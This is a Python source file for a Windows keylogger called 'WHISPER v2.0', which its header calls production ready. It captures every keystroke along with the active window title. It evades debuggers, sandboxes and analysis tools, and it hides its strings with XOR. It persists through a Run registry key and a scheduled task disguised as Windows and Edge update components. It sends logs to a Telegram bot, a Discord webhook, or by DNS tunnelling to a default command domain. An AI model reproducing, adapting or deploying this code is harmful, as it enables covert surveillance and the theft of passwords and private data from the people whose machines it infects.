"""
WHISPER v2.0
Target: Single Windows 11 endpoint
Author: [REDACTED]
Purpose: Persistent, stealth key capture with multi-channel exfil
Status: Production ready.
"""

import os
import sys
import time
import ctypes
import socket
import base64
import random
import hashlib
import threading
import json
from ctypes import wintypes
from datetime import datetime
from threading import Thread, Lock, Event

# Third-party imports - installed via requirements.txt
try:
    import psutil
    import requests
    from pynput import keyboard
    import winreg
except ImportError as e:
    # Fail silent. Don't leave traces.
    sys.exit(0)

# ============================================================
# CONFIGURATION - ALL SENSITIVE DATA FROM ENVIRONMENT
# ============================================================
class Config:
    # Required environment variables - no hardcoded credentials
    TG_BOT_TOKEN = os.getenv("WHISPER_TG_TOKEN")
    TG_CHAT_ID = os.getenv("WHISPER_TG_CHAT")
    DISCORD_WEBHOOK = os.getenv("WHISPER_DISCORD_URL")
    DNS_C2_DOMAIN = os.getenv("WHISPER_DNS_DOMAIN", "update-telemetry.com")
    
    # If critical vars missing, abort silently
    @classmethod
    def validate(cls):
        if not cls.TG_BOT_TOKEN or not cls.TG_CHAT_ID:
            sys.exit(0)
    
    # Obfuscation key - randomized at runtime
    XOR_KEY = random.randint(0x42, 0x7E)
    
    # Paths - randomized, hidden
    LOG_DIR = os.path.join(os.environ.get("APPDATA", ""), f".cache_{random.randint(10000,99999)}")
    MUTEX_NAME = f"Global\\{{{hashlib.md5(os.environ.get('COMPUTERNAME', '').encode()).hexdigest()[:16]}}}"
    
    # Timing
    LOG_FLUSH_INTERVAL = 500  # keystrokes before flush
    HEARTBEAT_INTERVAL = 3600  # seconds
    RETRY_DELAY = 30  # seconds on failure

# ============================================================
# ANTI-ANALYSIS SUITE
# ============================================================
class AntiAnalysis:
    @staticmethod
    def is_debugged():
        """Check if debugger attached."""
        try:
            return ctypes.windll.kernel32.IsDebuggerPresent() != 0
        except:
            return True  # Assume hostile if check fails
    
    @staticmethod
    def is_sandboxed():
        """Detect VM/sandbox environments."""
        indicators = [
            # VirtualBox
            os.path.exists(r"C:\Windows\System32\Drivers\VBoxGuest.sys"),
            os.path.exists(r"C:\Windows\System32\Drivers\vmmouse.sys"),
            # VMware
            os.path.exists(r"C:\Windows\System32\Drivers\vmhgfs.sys"),
            os.path.exists(r"C:\Windows\System32\Drivers\vmmemctl.sys"),
            # Hostname indicators
            "vbox" in os.environ.get("COMPUTERNAME", "").lower(),
            "vmware" in os.environ.get("COMPUTERNAME", "").lower(),
            "virtual" in os.environ.get("COMPUTERNAME", "").lower(),
            # Resource checks - sandboxes often have minimal resources
            psutil.cpu_count() < 2,
            psutil.virtual_memory().total < 3 * 1024**3,  # < 3GB RAM
            # Disk size check
            psutil.disk_usage('/').total < 40 * 1024**3  # < 40GB disk
        ]
        return any(indicators)
    
    @staticmethod
    def is_sleep_accelerated():
        """Detect sandbox sleep acceleration."""
        start = time.time()
        time.sleep(3)
        return (time.time() - start) < 2.5
    
    @staticmethod
    def is_analysis_tools_present():
        """Check for common analysis tools."""
        suspicious_processes = [
            "wireshark", "procmon", "process hacker", "ida", "x64dbg",
            "ollydbg", "immunity", "fiddler", "charles", "burp"
        ]
        for proc in psutil.process_iter(['name']):
            try:
                proc_name = proc.info['name'].lower()
                for suspect in suspicious_processes:
                    if suspect in proc_name:
                        return True
            except:
                continue
        return False
    
    @classmethod
    def should_abort(cls):
        """Master abort check - run before any malicious activity."""
        if cls.is_debugged():
            return True
        if cls.is_sandboxed():
            return True
        if cls.is_sleep_accelerated():
            return True
        if cls.is_analysis_tools_present():
            return True
        return False

# ============================================================
# STRING OBFUSCATION
# ============================================================
def xor_string(s, key=None):
    """XOR obfuscate strings to avoid static detection."""
    if key is None:
        key = Config.XOR_KEY
    return bytes([ord(c) ^ key for c in s]).decode('latin1', errors='ignore')

# Obfuscated strings - deobfuscated at runtime
_STR_NTDLL = xor_string("ntdll.dll")
_STR_KERNEL32 = xor_string("kernel32.dll")
_STR_USER32 = xor_string("user32.dll")

# ============================================================
# PERSISTENCE MECHANISMS
# ============================================================
class Persistence:
    @staticmethod
    def add_registry():
        """Add to HKCU Run key."""
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            # Masquerade as Windows Update component
            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    @staticmethod
    def add_scheduled_task():
        """Create scheduled task for logon trigger."""
        try:
            task_name = "MicrosoftEdgeUpdateTask_Machine"
            script_path = sys.executable
            cmd = f'schtasks /create /tn "{task_name}" /tr "{script_path}" /sc onlogon /f /rl highest /it'
            os.system(cmd)
            return True
        except:
            return False
    
    @staticmethod
    def ensure_persistence():
        """Multiple persistence layers."""
        Persistence.add_registry()
        Persistence.add_scheduled_task()

# ============================================================
# EXFILTRATION CHANNELS
# ============================================================
class Exfiltrator:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.primary_failed = False
        self.secondary_failed = False
    
    def telegram(self, message):
        """Primary C2 - Telegram bot."""
        if not Config.TG_BOT_TOKEN or not Config.TG_CHAT_ID:
            return False
        try:
            url = f"https://api.telegram.org/bot{Config.TG_BOT_TOKEN}/sendMessage"
            # Split long messages
            chunks = [message[i:i+4000] for i in range(0, len(message), 4000)]
            success = True
            for chunk in chunks:
                resp = self.session.post(url, 
                                        json={"chat_id": Config.TG_CHAT_ID, "text": chunk},
                                        timeout=15)
                if resp.status_code != 200:
                    success = False
            return success
        except:
            self.primary_failed = True
            return False
    
    def discord(self, message):
        """Secondary - Discord webhook."""
        if not Config.DISCORD_WEBHOOK:
            return False
        try:
            chunks = [message[i:i+2000] for i in range(0, len(message), 2000)]
            success = True
            for chunk in chunks:
                data = {"content": chunk}
                resp = self.session.post(Config.DISCORD_WEBHOOK, json=data, timeout=15)
                if resp.status_code not in [200, 204]:
                    success = False
            return success
        except:
            self.secondary_failed = True
            return False
    
    def dns_tunnel(self, data):
        """Last resort - DNS exfiltration."""
        if not Config.DNS_C2_DOMAIN:
            return False
        try:
            # Base32 encode for DNS compatibility
            b32 = base64.b32encode(data.encode()).decode().lower().replace('=', '')
            for i in range(0, len(b32), 50):
                chunk = b32[i:i+50]
                subdomain = f"{chunk}.{Config.DNS_C2_DOMAIN}"
                socket.gethostbyname(subdomain)
                time.sleep(0.1)  # Avoid rate limiting
            return True
        except:
            return False
    
    def exfiltrate(self, log_data):
        """Try all channels in order until one succeeds."""
        if self.telegram(log_data):
            return True
        if self.discord(log_data):
            return True
        if self.dns_tunnel(log_data):
            return True
        return False

# ============================================================
# MUTEX - SINGLE INSTANCE
# ============================================================
def ensure_single_instance():
    """Prevent multiple instances using named mutex."""
    try:
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexW(None, False, Config.MUTEX_NAME)
        if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            sys.exit(0)
        return mutex
    except:
        sys.exit(0)

# ============================================================
# KEYLOGGER CORE
# ============================================================
class KeyLogger:
    def __init__(self):
        self.buffer = []
        self.buffer_lock = Lock()
        self.current_window = ""
        self.exfil = Exfiltrator()
        self.running = Event()
        self.running.set()
        self.keystroke_count = 0
        self.last_exfil_time = time.time()
        
        # Ensure log directory exists
        os.makedirs(Config.LOG_DIR, exist_ok=True)
        
    def get_active_window(self):
        """Get title of current foreground window."""
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
            return buff.value
        except:
            return "Unknown"
    
    def format_key(self, key):
        """Format keystroke for logging."""
        try:
            # Handle special keys from pynput
            if hasattr(key, 'char') and key.char:
                return key.char
            elif hasattr(key, 'name'):
                special_map = {
                    'space': ' ',
                    'enter': '\n[ENTER]\n',
                    'tab': '\t',
                    'backspace': '[BS]',
                    'delete': '[DEL]',
                    'ctrl': '[CTRL]',
                    'ctrl_l': '[LCTRL]',
                    'ctrl_r': '[RCTRL]',
                    'shift': '[SHIFT]',
                    'shift_l': '[LSHIFT]',
                    'shift_r': '[RSHIFT]',
                    'alt': '[ALT]',
                    'alt_l': '[LALT]',
                    'alt_r': '[RALT]',
                    'caps_lock': '[CAPS]',
                    'esc': '[ESC]'
                }
                return special_map.get(key.name, f'[{key.name.upper()}]')
            else:
                return f'[{str(key)}]'
        except:
            return ''
    
    def on_press(self, key):
        """Key press handler."""
        if not self.running.is_set():
            return False
            
        try:
            formatted = self.format_key(key)
            current_win = self.get_active_window()
            
            with self.buffer_lock:
                # Window change logging
                if current_win != self.current_window and current_win:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    window_header = f"\n[{timestamp}] WINDOW: {current_win}\n"
                    window_header += "-" * 40 + "\n"
                    self.buffer.append(window_header)
                    self.current_window = current_win
                
                # Add keystroke
                self.buffer.append(formatted)
                self.keystroke_count += 1
                
                # Check flush conditions
                if len(self.buffer) >= Config.LOG_FLUSH_INTERVAL:
                    self.flush()
                    
        except Exception:
            pass
            
        return True
    
    def flush(self):
        """Flush buffer to exfiltration."""
        if not self.buffer:
            return
            
        with self.buffer_lock:
            log_content = ''.join(self.buffer)
            self.buffer = []
            
        # Add metadata
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        hostname = os.environ.get('COMPUTERNAME', 'UNKNOWN')
        username = os.environ.get('USERNAME', 'UNKNOWN')
        header = f"[{timestamp}] HOST: {hostname} | USER: {username}\n{'='*50}\n"
        full_log = header + log_content
        
        # Try exfiltration
        self.exfil.exfiltrate(full_log)
        self.keystroke_count = 0
        
    def heartbeat(self):
        """Periodic heartbeat to confirm implant is alive."""
        while self.running.is_set():
            time.sleep(Config.HEARTBEAT_INTERVAL)
            if self.running.is_set():
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                hostname = os.environ.get('COMPUTERNAME', 'UNKNOWN')
                self.exfil.telegram(f"[HEARTBEAT] {hostname} alive at {timestamp}")
    
    def start(self):
        """Start the keylogger."""
        try:
            # Start heartbeat thread
            heartbeat_thread = Thread(target=self.heartbeat, daemon=True)
            heartbeat_thread.start()
            
            # Start keyboard listener
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()
                
        except KeyboardInterrupt:
            pass
        except Exception:
            pass
        finally:
            self.running.clear()
            self.flush()  # Final flush on exit

# ============================================================
# MAIN ENTRY POINT WITH RESILIENCY
# ============================================================
def main():
    # Validate configuration
    Config.validate()
    
    # Anti-analysis checks
    if AntiAnalysis.should_abort():
        sys.exit(0)
    
    # Single instance check
    ensure_single_instance()
    
    # Establish persistence
    Persistence.ensure_persistence()
    
    # Main loop with auto-restart on crash
    while True:
        try:
            logger = KeyLogger()
            logger.start()
        except Exception:
            time.sleep(Config.RETRY_DELAY)
            continue
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    main()
